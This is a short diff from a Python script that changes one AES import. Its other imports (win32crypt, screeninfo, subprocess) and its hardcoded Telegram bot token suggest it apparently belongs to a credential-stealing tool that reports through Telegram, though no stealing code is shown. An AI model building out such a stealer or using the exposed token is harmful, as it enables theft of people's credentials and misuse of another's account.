@@ -17,7 +17,7 @@ import threading
 import subprocess
 import win32crypt
 from typing import Union
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 from screeninfo import get_monitors
 
 bot_token = '7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc'
